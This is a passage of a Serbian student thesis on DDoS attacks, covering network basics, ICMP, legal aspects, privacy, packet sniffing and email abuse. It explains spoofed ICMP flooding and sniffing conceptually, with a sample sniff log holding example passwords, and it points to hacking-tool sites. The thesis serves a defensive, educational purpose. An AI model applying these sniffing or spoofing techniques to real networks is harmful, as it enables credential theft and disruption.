**DDOS** [**SREćKO JOVANčEVIĆ**](https://web.archive.org/web/20030415103235/mailto:xxx-x@amadeus.uni-bk.ac.yu)

**SADRŽAJ**

&nbsp;

&nbsp;

| **1\. Uvod**<br><br>&nbsp;<br><br>**2\. Mreže**<br><br>&nbsp;<br><br>**2.1 Pojam, istorija i razvoj**<br><br>**2.2 Mrežni protokoli**<br><br>**2.3 Pojam haker/hakovanje**<br><br>**2.4 Pojam zaštite elektronskih podataka**<br><br>**2.5 Pojam zaštite elektronskih podataka pravni aspekt**<br><br>**2.6 Podela mogućih napada na računarsku mrežu**<br><br>&nbsp;<br><br>**3.Ugrožavanje privatnosti**<br><br>&nbsp;<br><br>**3.1 Privatnost kao pojam**<br><br>**3.2 Ugrožavanje privatnosti prisluškivanjem**<br><br>&nbsp;<br><br>**4.Preteče DDOS-a**<br><br>&nbsp;<br><br>**4.1 Zloupotrebe elektronske pošte**<br><br>**4.2 Propaganda u komercijalne svrhe**<br><br>**4.3 Lažno predstavljanje putem elektronske pošte**<br><br>**4.4 Korišćenje e-maila kao oblik distribuiranog napada**<br><br>**4.5 Neovlašćeno ulaženje na računarski sistem**<br><br>&nbsp;<br><br>**5\. DDOS**<br><br>&nbsp;<br><br>**5.1 DDOS pojam**<br><br>**5.2 Za šta se DDOS može koristiti ?**<br><br>**5.3 Kako on radi ?**<br><br>&nbsp;<br><br>**6.0 Detaljan opis DDOS alata (TFN project)**<br><br>&nbsp;<br><br>**6.1 Intro**<br><br>**6.2 Izvršni kod ("verzije 1.3 build 0053") TFN servera**<br><br>**6.3 Komunikacija između klijenta i servera**<br><br>**6.4 Pokretanje klijent programa**<br><br>**6.5 Zaštita šiframa**<br><br>**6.6 Tragovi (Fingerprints)**<br><br>**6.7 Prikaz aktivnosti TFN servera (različitim paketima za praćenje saobraćaj kao i aktivnih procesa)**<br><br>**6.8 Lokalna Odbrana**<br><br>**6.9 Slabosti**<br><br>&nbsp;<br><br>**7.0 Zaključna razmatranja**<br><br>&nbsp;<br><br>**Prilog A: Zakrpa za sniffit v. 0.3.7.beta za prikaz ne standardnih ICMP podataka**<br><br>**Prilog B: Zakrpa za tcpshow 1.0 za prikaz ICMP ECHO identifikacije /sekvence**<br><br>**Prilog C Perl skripta "civilize" za kontrolu TFN servera** | **2**<br><br>&nbsp;<br><br>**4**<br><br>&nbsp;<br><br>**4**<br><br>**4**<br><br>**6**<br><br>**6**<br><br>**7**<br><br>**8**<br><br>&nbsp;<br><br>**9**<br><br>&nbsp;<br><br>**9**<br><br>**9**<br><br>&nbsp;<br><br>**13**<br><br>&nbsp;<br><br>**13**<br><br>**14**<br><br>**15**<br><br>**16**<br><br>**17**<br><br>&nbsp;<br><br>**20**<br><br>&nbsp;<br><br>**20**<br><br>**20**<br><br>**21**<br><br>&nbsp;<br><br>**22**<br><br>&nbsp;<br><br>**22**<br><br>**23**<br><br>**24**<br><br>**24**<br><br>**26**<br><br>**27**<br><br>**28**<br><br>**32**<br><br>**33**<br><br>&nbsp;<br><br>**35**<br><br>&nbsp;<br><br>**37**<br><br>**39**<br><br>**40**<br><br>&nbsp; |
| -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |

**S**

&nbsp;

&nbsp;

&nbsp;

**1.Uvod**

&nbsp;

Cilj ovog rada je da se ukaže na problem koji je u prethodne 3 godine postao jedan od najistaknutijih problema vezanih sa internetom i mrežama u celini .Većina korporativnih mreža ,bilo da se radi o internet provajderima ili da se radi o manjim korporacijama su podložni različitim vrstama napada koji smanjuju operativnu moć koje računarske mreže pružaju tim kompanijama.

Da bi smo rad pravilno struktuirali i čitaocu ovog rada omogućili lakše uključivanje u materiju započeo sam sa osnovnim stvarima i istorijom računarskih mreža da bih preko objašnjena kako ona funkcioniše i koji su to metodi i načini na koji ona stvarno radi omogućio objašnjenje početnih pojmova neophodnih za dalju raspravu.

Takođe u ovom delu sam napravio i mali osvrt na pojmove zaštite podataka i sa pravnog i fizičkog aspekta da bih bolje objasnio kako to sve izgleda u našoj sredini.

&nbsp;

Treće poglavlje se bavi temom Privatnosti kao oblasti koja kod nas nije preterano zastupljena niti potencirana dok joj se na zapadu pridaje ogromna važnost. Zaštita privatnosti elektronskih poruka ili prosto zaštita lične privatnosti je jedno od osnovnih načela koje važi u zapadnom zakonodavstvu, i ovim bih hteo da možda potencijalno otvorim to pitanje i u našoj sredini.

&nbsp;

Četvrto poglavlje se bavi pretečama DDOS napada koji je tema ovog rada. Želja mi je bila da prikažem kako su i pre DDOSa korporativne mreže bile ugrožene od strane nesavesnih i zlonamernih korisnika. Ništa manje opasni nisu bili ni ti metodi koji su korišćeni kao što je lažno predstavljanje putem e-maila, neovlašćeno korišćenje e-maila u propagandne svrhe i na kraju kao pretečama distribuiranog napada.

&nbsp;

U petom i šestom poglavlju sam i započeo najzanimljiviji deo rada za mene, to jest samu DDOS tehniku napada, i pokušao sam da pružim detaljan prikaz na koji način sve to funkcioniše i koji su potencijali takvog jednog ugrožavanja korporativne mreže. Takođe dajući prikaz aktivnost jednog TFN servera sa raznim alatima za praćenje mrežnog saobraćaja želeo sam čitaocu da pružim kvalitetniji i detaljniji pregled ove materije. Pokušao sam i da objasnim koje su to slabosti koje postoje u načinima odbrane i metodama za lokalnu odbranu.

Na kraju umesto zaključka želeo sam da svoje dugogodišnje iskustvo koje sam stekao kao sistem administrator računarske mreže na Univerzitetu "Braća Karić", pretvorim u niz saveta koji mogu poslužiti kao uputstvo i vodiči kako da se pokuša uspešno braniti jedna korporativna mreža i koje su osnovne mere predostrožnosti i zaštite.

Kao što sam već naveo na samom kraju ne postoji nikakav apsolutni metod zaštite ni jedne korporativne mreže, već se sve svodi na to da korporacija neprestano ulaže resurse u modernizaciju same računarske mreže i da se sami administratori moraju non stop edukovati o novim metodama i tehnikama kako napada tako i odbrane.

Ako sam sa ovim radom delimično uspeo u tome da bar nekome približim problematiku mreže i mrežnog napada i odbrane biću više nego zadovoljan.

&nbsp; Hteo bih da zahvalim Profesoru Stevici Krsmanoviću što je uvideo značajnost ove teme i samog problema i što mi je dozvolio da tu temu obradim.Takođe se zahvaljujem kolegama koji su mi pružili podršku : Vladimir Šašo administrator mreže Fakluteta za Mendžment "Braća Karić" ,Edževitu Halitiju administrator mreže Fakulteta za Trgovinu i Bankarstvo "Janićije i Danica Karić",Velimir Dedić sistem inženjer pri računskom centru Univerziteta "Braća Karić", Branimir Savić rukovodiocu računskog centra Univerziteta "Braća Karić" , Aleksandar Bijelić Network security Consultant, Ana Agatonović account-operator Fakluteta za Menadžment "Braća Karić" i Zoranu Tadiću studentu Ekonomskog fakulteta.

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

**2.Mreže**

&nbsp;

&nbsp;

**2.1 Pojam, istorija i razvoj**

&nbsp;

Pod pojmom mreže podrazumevamo skup računara i uređaja koji su sposobni da međusobno komuniciraju često i na velike daljine razmenjujući pri tom informacije preko posredujućih računara.

Internet mreža je nastala iz razvoja ARPA NET koji je bio prva vrsta mreže kakve danas poznajemo i bila je korišćena za potrebe američke vojske koja ju je razvila da bi mogla da komunicira na velike daljine kao i da povežu institucije koje su bile od ključnog značaja za američku vojsku.

Kasnije su se na tu mrežu polako povezivali i univerziteti i to je bio prvi oblik mreže i mrežnog okruženja kakvo danas poznajemo. Sa razvojem prednosti korišćenja mreže u poslovnom okruženju pojavile su se i opasnosti i mane kojih su kompanije morale biti svesne pre upuštanja u rizik zvani poslovanje na mreži.

Jedna od najviše spominjanih opasnosti, o kojoj će i biti reči u ovom radu, je opasnost od gubljenja podataka i o onemogućavanju razmene istih usled ugrožavanja sigurnosti same mreže.

Sigurnost mreže i podataka na računarima može biti ugrožena na razne načine ali nazivi koje se najčešće spominju u vezi toga su hakovanje (eng. hacking) i hakeri (eng hackers).

&nbsp;

**2.2 Mrežni protokoli**

&nbsp;

&nbsp; Protokol je jezik koji se koristi za komunikaciju između dva računara koji su povezani u mrežu,gde protokol definiše kako se podaci pakuju za prenos preko mreže kako bi računar koji ih prima mogao da ih korektno raspakuje Neophodno je da računari na istoj mreži koriste isti protokol za komunikaciju.

&nbsp; Protokol koji će ovde imati presudnu ulogu jeste ICMP (internet message control protocol-internet protokol kontrolnih poruka)

&nbsp;

**ICMP**\-internet protokol kontrolnih poruka obezbeđuje mehanizam prijave greški i kontrolnih poruka **TCP/IP** (transfer control protokol/internet protokol) protokolu kao osnovnom protokolu za komunikaciju na mrežama otvorene arhitekture kao što je Interent.

Funkcije koje ICMP protokol obavlja:

· Poseduje eho poruke i poruke potvrde kojima se testira pouzdanost veze između dva računara.Ovo se postiže upotrebom PING komande

· Redirekciju saobraćaja, radi poboljšanja rutiranja u slučaju zagušenja rutera pri obimnom mrežnom saobraćaju.

· Šalje poruke o isteku vremena predviđenog za egzistiranje paketa (istek vremena predviđenog parametrom TTL)

· Šalje zahtev ruteru za dobijanje adresa svih rutera na mrežnom segmentu.

· Obezbeđuje slanje poruka računaru sa direktivom za usporavanje saobraćaja , u slučaju da je ruter opterećen

· Utvrđuje masku podmreže mrežnog segmenta.

&nbsp;

Format ICMP paketa

| Tip<br><br>Kod<br><br>Kontrolna suma<br><br>Tipski podatci | &nbsp; | &nbsp; | | &nbsp; | &nbsp; | | &nbsp; | &nbsp; | | &nbsp; | &nbsp; | | &nbsp; | | | | | | | | | | | |
| --- | --- | --- | | --- | --- | | --- | --- | | --- | --- | | --- | | | | | | | | | | | | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| &nbsp; | &nbsp; | | &nbsp; | &nbsp; | | &nbsp; | &nbsp; | | &nbsp; | &nbsp; | | &nbsp; | | | | | | | | | | | |
| &nbsp; | | &nbsp; | | | &nbsp; | | | &nbsp; | | | &nbsp; | | &nbsp; | &nbsp; | &nbsp; | &nbsp; | &nbsp; | &nbsp; | &nbsp; | &nbsp; | &nbsp; | &nbsp; | &nbsp; |
| Polje promenjive dužine | | | | | | | | | | | | | | | | | | | | | | | |
| | | | | | | | | | | | | | | | | | | | | | | | | |

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

**slika 1**

&nbsp;

&nbsp;

&nbsp;

Polja ICMP paketa:

&nbsp;

| **Polje** | **Opis**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| --------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| &nbsp;    | **0-Mreža nedostupna**<br><br>**1-Računar nedostupan**<br><br>**2-Protokol nedostupan**<br><br>**3-Port nedostupan**<br><br>**4-Potrebna fragmentacija**<br><br>**5-Neuspešna izvorna ruta**<br><br>**6-Odredišna mrea nije poznata**<br><br>**7-Odredični računar nije poznat**<br><br>**8-Izvorišni računar izolovan**<br><br>**9-Komunikacija sa odredišnom mrežom nije administrativno dozvoljeno**<br><br>**10-Komunikacija sa odredišnim računarom nije administrativno dozvoljena**<br><br>**11-Mreža nedostupna za taj tip servisa**<br><br>**12-Računar nedostupan za taj tip servisa**<br><br>**Dodatne informacije koje nepostoje u polju za tip**<br><br>**Detekcija greške za ICMP deo**<br><br>**Sadržaj ovog tipa zavisi od tpa funkconalnost koju ICMP pruža. Ukoliko je Echo Reguest/Echo Reply (najčešći slučaj),ovo polje sadrži indetfikator i broj sekvence koje se koristi pri svakom slanju Echo zahteva i odgovara**<br><br>&nbsp;<br><br>&nbsp; |

&nbsp;

**slika 2**

&nbsp;

&nbsp;

&nbsp;

Zbog same prirode ICMP protokla hakeri mogu da eksploatišu sam protokol na taj način što mogu da u polja ICMP protokola upisuju one podatke koji nisu po ustaljenim vrednostima obuhvaćene u samom protokolu.Odnosno svaki paket koji šalju na odredišnu adresu nemora da ima njenu stvarnu polaznu adresu, tako da na taj način mogu da pošalju pakete na raličite adrese sa polaznom adresom targetirane mreže i tako da se odgovori koji su poslati vraćaju na adresu targetirane mreže i na taj način stvaraju zagušenje targetiranoj mreži.Ovakav vid hakerskih aktivnosti predstavlja osnov distribuiranih napada na mreže.

&nbsp;

&nbsp;

**2.3 Pojam haker/hakovanje**

Pojam haker (eng. hacker) u svom značenju opisuje osobu koja se bavi istraživanjem mogućnosti računara i njihovoj primeni u svakodnevnom životu inače prvi put pomenut sredinom 70-tih godina kada su dva studenta sa MIT-a koristeći trikove(hackove) ušli na Univerzitetski mejn frejm.

Hakeri se još i definišu i kao ljudi koji su po prirodi radoznali, koji vole sve da saznaju i ne vole kad je nešto sakriveno od njih. Tokom godina pojam haker je počeo da se vezuje za ljude koji neovlašteno ulaze (tačniji pojam je upadaju) na razne računarske sisteme i manje ili više uspešno pokušavaju da ovladaju sistemom. Takođe se pojavljuju različiti stavovi da li su hakeri u stvari loši (jer neovlašteno pristupaju raznim računarskim sistemima) ili su dobri (jer pokazujući da postoje propusti u sigurnosti nas teraju da unapređujemo svoje programe i sisteme zaštite).

&nbsp;

&nbsp;

**2.4 Pojam zaštite elektronskih podataka**

&nbsp;

Godinama se napad na računarske mreže rešavao dobrim katancem i pravilnim zaključavanjem kancelarije koje imaju računare sa osetljivim podacima. Bilo je dovoljno imati i dva čuvara čiji bi posao bi da paze da neko fizički ne provali u kancelariju i tu na licu mesta pokuša da prisvoji ili uništi određene podatke koje smo hteli da sačuvamo.

Uvođenjem računarske mreže u kancelarijski način rada a posebno sa uvođenjem interneta i klijent/server arhitektura sam koncept zaštite elektronskih podataka morao je da doživi dramatičnu promenu.

Sada više nije bilo neophodno biti fizički prisutan u prostoriji gde se nalazi računar na kome se nalaze poverljivi podaci. Napad je mogao biti izvršen i iz susedne prostorije ili sa drugog kontinenta, a podaci preneseni bez vidljivog uznemiravanja čuvara koji su sedeli ispred prostorije.

Koncept sigurnosti je sada shvatan ne kao fizičko obezbeđivanje prostorije već kao niz sofisticiranih tehnika i metoda kojim bi sam računarski sistem bio zaštićen i obezbeđen.

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

**2.5 Pojam zaštite elektronskih podataka pravni aspekt**

&nbsp;

Predlogom novog krivičnog zakonika definisani su kriterijumi šta se sve može smatrati pod krivičnim prekršajem vezano za temu računara i računarskih komunikacija.

&nbsp;

· Neovlašćeni pristup i korišćenje računarskih sistema i mreža

· Namerno oštećivanje računarskih programa i podataka- Sabotiranje rada računarskih sistema i mreža

· Pravljenje virusa i njihovo unošenje u računarske sisteme

· Ometanje funkcionisanja sistema za elektronsku obradu podataka i računarskih mreža

· Povreda tajnosti elektronske pošte

· Sprečavanje ili ograničavanje pristupa računarskim mrežama

· Neovlašćeno prikupljanje i objavljivanje privatnih fotografija, spisa i ličnih podataka

· Prisluškivanje

· Uvreda i kleveta

· Objavljivanje zabranjenog pornografskog materijala (pedofilija)

· Posredovanje u vršenju prostitucije

· Povreda intelektualne svojine (copyright)

· Narušavanje poslovnog ugleda

· Oštećivanje mrežnih kablova

· Terorizam- Špijunaža

· Izazivanje panike i nereda

· Udruživanje radi vršenja kriminalnih dela (ugovaranje akcija, prikrivanje dokaza, itd)

&nbsp;

Član 34 krivičnog zakona o kompijuterskom kriminalu

&nbsp;

&nbsp; Svi ovi predlozi zakona imaju jako dobru osnovu, međutim problem koji se javlja leži u samom okviru zakona, "Nevin dok se ne dokaže krivim" , jer mogučnost dokazivanja ovakve vrste kriminalnih radnji graniči se sa teoretskom neverovatnošću, iz jednostavnog razloga što kod nas nepostoji obučen pravosudni kadar koji bi mogao da procesira ovakav slučaj. Što znači , da ukoliko se počinilac sam neprijavi, skoro da nepostoji šansa da mu se uđe u trag.

&nbsp; U Jugoslaviji se trenutno obučava oko 10 sudija, tužilaca i branioca za ovu vrstu kriminalnih radnji, tako da će u skorije vreme i kod nas postojati strah od zakona na internetu.

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

**2.6 Podela mogućih napada na računarsku mrežu**

&nbsp;

Za samu računarsku mrežu pojmovi blizu ili daleko imaju potpuno promenjeno značenje.

&nbsp;

&nbsp; Pod lokalnim pristupom (local access) smatra se rad korisnika koji je uredno prijavljen na računarski sistem i sve radnje obavlja na samom sistemu (rad u shell-u, kontrolisanje elektronske pošte ili surfovanje sa samog računara- lynx ) odnosno kada je početna adresa korisnika jednaka krajnjoj adresi.

&nbsp;

&nbsp; Pod pristupom na daljinu (remote access) podrazumevamo rad pri kojem korisnikova početna adresa paketa nije ista kao i krajnja adresa servera na kome radi.

&nbsp;

&nbsp; Pojavom UNIX/LINUX kao operativnih sistema koji u potpunosti podržavaju mrežni rad, stvari se još dodatno komplikuju.

&nbsp;

&nbsp; Kada korisnik sa svog računara pokušava da inicira sesiju na nekom serveru sam pristup tom serveru se smatra kao pristup na daljinu (remote access) ali sav rad koji obavlja na tom serveru, a tiče se samog boravka na serveru, se smatra radom u lokalu. (primer remote access ssh sesije na jedan server, ali se čitanje pošte iz PINE smatra lokalnim pristupom, jer za taj server sam program i jeste iniciran iz lokala)

&nbsp;

&nbsp; Samim tim pri zaštiti računarskih mreža moramo voditi računa i o jednom i o drugom pristupu kao o načinima na koji se potencijalno može ugroziti sigurnost.

Kada pričamo o napadu na računarsku mrežu moramo kvalifikovati sam pojam napada, šta on znači za nas i kako se odražava na nas kao vlasnike računarske mreže.

&nbsp;

&nbsp; Napadom na računarsku mrežu se smatra svaka aktivnost koja je usmerena ka tome da izazove ugrožavanje privatnosti, usporavanje ili ometanje normalnog odvijanja procesa rada u samoj računarskoj mreži.

&nbsp;

Sami napadi na računarsku mrežu i sisteme mogu se podeliti na sledeće kategorije:

&nbsp;

· ugrožavanje privatnosti

· zloupotrebe elektronske pošte

· potpuno ili delimično prekidanje servisa (Denial of Service)

· neovlašćeno ulaženje na računarski sistem

&nbsp;

&nbsp;

&nbsp;

**3\. Ugrožavanje privatnosti**

&nbsp;

**3.1 Privatnost kao pojam**

&nbsp; Privatnost je moć da se kontroliše ono što drugi ljudi znaju o vama. Tačnije: to je mogućnost da se kontroliše istina o vama koju ostali ljudi znaju.

&nbsp;

Privatnost je zasnovana na našoj sposobnosti da krijemo istinu.

Postoje dve vrste podataka koje zakon pokušava da zaštiti:

1\. podaci koje smo nekome poverili, ili podaci koje je neko drugi prikupio o nama,

2\. podaci o nama koje držite u tajnosti, koji su samo nama poznati.

Prva vrsta privatnosti koju bi zakon trebao da štiti - jeste privatnost informacija. Ako ste učinili javnom informaciju o vrednosti vaše kuće, stavljajući je pod hipoteku u sudu, ipak želite kontrolu nad dostupnošću tih podataka ostalima. Ili ako ste u apoteci kupili test za proveru trudnoće, i isti platili kreditnom karticom (time otkrivajući svoj identitet), i dalje ne želite da ta informacija bude dostupna svima u vašem gradu.

Druga vrsta privatnosti nam je poznatija: koliko novca imate u novčaniku, šta pišete u pismima svojoj dragoj(om), koje programe gledate na televiziji, šta mislite o javnim ličnostima, političarima...

To su sve informacije koje bi smo želeli da zadržimo samo za sebe.

Sama privatnost naši podataka može biti ugrožena i zloupotrebljena na više načina:

Ugrožavanje privatnosti prisluškivanjem gde je cilj sakupiti što više informacija o određenoj osobi

Ugrožavanje privatnosti e-mail poruka - (od strane poslodavca, kolega, trećih lica, državnih organa ...)

Ugrožavanje privatnosti davanjem sakupljenih informacija o nama trecim licima koja su za njih zainteresovana (internet oglašivačima, prodavcima određenih proizvoda i sl.)

&nbsp;

**3.2 Ugrožavanje privatnosti prisluškivanjem**

&nbsp;

Sam metod prisluškivanja (eng sniffing) zasniva se na osnovnim principima rada mreže gde paketi putuju od jednog do drugog računara pokušavajući da stignu do svoje krajnje odrednice - računara kome želimo da pristupimo.

&nbsp;

U svakodnevnom radu i komunikaciji između dva računara najčešće korišćena komanda za prelaz sa jednog na drugi računrar putem mreže je komanda telnet, stim da se telnet ne uzima kao jedini vid pristupa ka nekom odredišnom računaru .

Način uspostavljanja veze između dva računara je sledeći (recimo da se nalazimo na računaru A, a B je računar na koju se "telnetujemo"):

&nbsp;

&nbsp;

&nbsp; 1. A -----SYN----> B

&nbsp;

&nbsp; 2. A <---SYN/ACK--- B

&nbsp;

&nbsp; 3. A ACK----> B

&nbsp;

slika 3

&nbsp;

Najpre računrar A šalje zahtev za otvaranjem konekcije (SYN). Zatim računrar B odgovara sa tzv. SYN/ACK potvrdom da je zahtev za otvaranjem konekcije od strane klijenta A prihvaćen i u trecem koraku klijent uspostavlja vezu sa serverom B.

Recimo da klijent A ima IP adresu 66.66.66.66 a server B 66.66.66.99.

Konekcija koja se formira od mašina A ka mašini B putem koje se šalje sve što mi kucamo će imati oblik: 66.66.66.66.3456-66.66.66.99.23. Povratne informacije ka klijentu A se šalju putem: 66.66.66.99.23-66.66.66.66.3456. Pretpostavimo da se A i B nalaze na istoj mreži sa računarima C, D, E, F itd.

Tj. šematski:

&nbsp; A-------------------------------B

&nbsp; \\ \\ \\ \\

&nbsp; C D E F

&nbsp;

slika 4

&nbsp;

Ukoliko neko znatiželjan ima fizički pristup nekom od računara C, D, E, F sve što treba da uradi je da pokrene neki eternet sniffer i svako slovo koje otkucamo će se pojaviti ili u sniff log fajlovima ili na ekranu u zavisnosti od same konfiguracije snifera. Tipičan sniff log izgleda ovako

**................vt100..................neko.PaswOrd1.w. ps -u ivana...ls -ald /var/mail/vana....su.idiot96.clear. cd /var/mail.tail -f ivana...more ivana.cat .cd.w.ps -u ivana .finger ivana...cd /var/mail.cat ivana...id**

slika 5

&nbsp; Tačkicama su zamenjeni specijalni karakteri, kao npr ^M za return. Iz ovoga sniff loga moze se lako utvrditi da korisnik neko kao identifikaciju koristi password "**PaswOrd1**". Dalje, može se utvrditi da je taj korisnik veoma zainteresovan za korisnicu "**Ivana**". Takođe se može primetiti da taj korisnik zna **root**\-ov password i da je putem komande su postao **root** ( pod pojmom root podrazumevamo fizički pristup hardveru na računaru na kojoj se kao operativni sistem koristi UNIX). Takođe se moze videti da je root-ov password u ovom slučaju "**idiot96**", kao i da se korisnik "**neko**" intenzivno interesuje za sadržaj

mail-a korisnice sa usernamom "ivana".

&nbsp; Gore navedeni primer je veoma poučan, jer pokazuje koliko je lako ugroziti nečiju sigurnost podataka i da je korišćenje telneta neopravdano i veoma opasno. Dovoljno je sačekati da korisnik pod imenom "**neko**" ne bude ulogovan na računrar jer bi bilo suludo biti ulogovan na kome su ovi podaci važeći i iskoristiti ih . Računar host neće znati na osnovu unetih podataka da li je to stvarno korisnik neko ili ne.

Ipak, nameće se pitanje: zašto bi nekoga uopšte zanimao naš username/password? Razlog je veoma jednostavan. Normalne instalacije UNIX-a su na žalost veoma loše napisane. Ponekada je dovoljno samo pribaviti username i password i dobiti root pristup na računaru.

&nbsp;Prisluškivanje (sniffovanje) je veoma popularna tehnika među hakerima, dokonim administratorima, kriminalcima, za sticanje potrebnih informacija. Sem toga računari komuniciraju putem kablova koji oko sebe stvaraju elektromagnetsko polje. Signale koji se šalju moguće je hardverski snimati i zatim kasnije analizirati.

Još lošija situacija je ako je neko root na računaru A sa kojeg se mi npr. telnetujemo, postoji mogućnost da nam jednostavno preuzme telnet sesiju, a isto to je moguće ako se neko nalazi na hostu C koji se nalazi između A i B (slika 1). Iz svega gore navedenog jasno je da je upotreba telneta ili ftp-a koji na mrežu šalju podatke u izvornom obliku neprihvatljiva.

Komandom traceroute uvek možemo utvrditi sve potencijalne lokacije na kojima možemo očekivati da neko snifuje.

            Ako neko poznaje naš username i password, kada se jednom uloguje može da radi šta god poželi sa podacima na našem nalogu. Na svu sreću obični korisnici nemaju mogućnost da pristupaju hardveru, pa samim tim ni da mrežnu karticu prebace u tzv. promiscuous mod rada koji je potreban sniferu da bi preuzimao sve podatke sa lokalne mreze. Ali da sreća ne bude potpuna postoji puno korisnika koji to mogu i čine svakodnevno.

&nbsp;

&nbsp; Danas se sve manje koristi **telnet** kao servis za daljinsko pristupanje zbog njegove nesigurnosti .Umesto njega danas se koristi **SSH** (secure shell) servis koji za razliku od telneta enkriptuje celokupan saobraćaj u komunikaciji između korisnika i servera.

&nbsp;

&nbsp; Pored prisluškivanja telnet sesija moguće je prisluškivati i sve ostale TCP/IP sesije koje ne koriste metode kriptovanja. Samim tim znači da je jedan od servisa koji je i doprineo velikoj popularizaciji interneta ,e-mail , takođe ugrožen.

&nbsp;

&nbsp; Mesta gde se sve može neovlašteno pristupiti jednom e-mailu koji je poslat sa neke udaljene mreže se broje velikim ciframa.

&nbsp;

&nbsp; O tome da li pojedinac lično smatra da mu je neophodna privatnost njegove elektronske pošte ili ne je njegovo pravo da odluči, ali novi predlog zakona to poistovećuje sa otvaranjem običnih pisama koji se smatra krivičnim delom.

&nbsp;

&nbsp; O privatnosti elektronske pošte i samoj vrednosti pisama koja se razmenjuju između firmi,organizacija i institucija i diskusijama koje su o tome vođene u svetu podstiču sve firme koje obavljaju deo svoje komunikacije preko interneta da posvete ogroman deo novca i vremena u sisteme i metode zaštite privatnosti elektronske pošte. Čak je donet zakon o privatnosti elektronske pošte na radnom mestu kojim se jasno definiše da li i kad poslodavac ima pravo da kontroliše elektronsku poštu svojih zaposlenih.

&nbsp;

Mislim da bi podizanje ovog pitanja u našoj sredini i na samim fakultetima bilo od velikog značaja za uvođenje normi ponašanja na internetu.

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

**4.Preteče DDOS-a**

&nbsp;

**4.1 Zloupotrebe elektronske pošte**

&nbsp;

Pod zloupotrebom elektronske pošte tokom godina su se izdvojili različiti pravci posmatranja.

· Sakupljanje ličnih informacija

· Zloupotreba podataka u komercijalne svrhe putem e-mail-a

· Lažno predstavljanje pute elektronske pošte (e-mail)

· Korišćenje e-maila kao načina distribucije virusa

&nbsp;

Sakupljanje ličnih informacija (Personal data abuse) Kršenje privatnosti korisnika je kada se podaci o njima daju trećim licima bez njihovog odobrenja.

&nbsp;

&nbsp; AOL je to učinio kada je dao podatke o mlađem podoficiru Timotiju Mek Veitu. Ti podaci su sadržali podatke o njegovom seksualnom opredeljenju (to da je on homoseksualac i da je posetio određene sadržaje na interenetu i da je bio u kontaktu sa određenim brojem homoseksualaca). Americka mornarica je tražila te podatke i iskoristila ih da bi ga otpustila. Mek Veit je podigao optužnicu protiv AOL-a zbog napada na privatnost, ali su oni nastavili da brane svoj postupak i svoje pravo da koriste podatke na način kako su im potrebni.\*

&nbsp; Ono što je bito u svim ovim slučajevima da se svi ti podaci daju bez njihovog znanja i samim tim bez njihovog pristanka.Te podatke zatim dalje mogu da koriste i razne druge agencija,službe i slične organizacije. Čak je na pojedinim mestima omogućeno pojedincima da lako dođu do svih relevantnih podataka o drugom pojedincu.

&nbsp; Poseban problem kod e-mail poruke je u tome što u osnovi daje previše podataka o onome koji je šalje. Iz nje se može zaključiti odakle je poslata, iz koje zemlje,ko je pošiljalac, u koje vreme je poslata, preko kojih je sve servera prošla dok nije stigla do određene destinacije.

&nbsp; Teško je izbeći kriminal koji je vezan za elektronsku poštu, pošto je lako pratiti rad korisnika na sistemima sa PINE programom za pristup pošti, probijati kodiranu zaštitu moćnim i lako dostupnim softverom i ubacivati se u

sisteme sa alatima koji su dostupni na internetu :SpyNet (pages.prodigy.com/waite/waite1.htm#SpyLinks) ili Hacking Arcade (<www.angelfire.com/ak/ankit1).Kodiranje> je mogućnost, ali ako neko stvarno želi da čita vaše poruke moze veoma lako da ih dekodira sa odgovarajućim softverom.

&nbsp; Trenutno američko zakonodavstvo manje pažnje polaže na privatnost nego na praćenje toga šta ljudi pišu, kome i koliko često. To može da izgleda neophodno u nekim slučajevima, kao sto je slučaj Džejka Bejkera.

&nbsp; Džejk, student, je uhapšen zato što je poruka koju je poslao sadržala "komunikaciju na međudržavnom ili međunarodnom nivou koja sadrži pretnje, sa ciljem da se ponizi tuđa ličnost".

&nbsp;

&nbsp;

&nbsp; Očigledno imate pravo da šaljete takve poruke, ali uz rizik da budete nadgledani, ispitivani i javno poniženi. Nameće se pitanje: šta to prosečan korisnik elektronske pošte piše kada je potrebno da se to nadgleda od strane vlasti.

&nbsp;

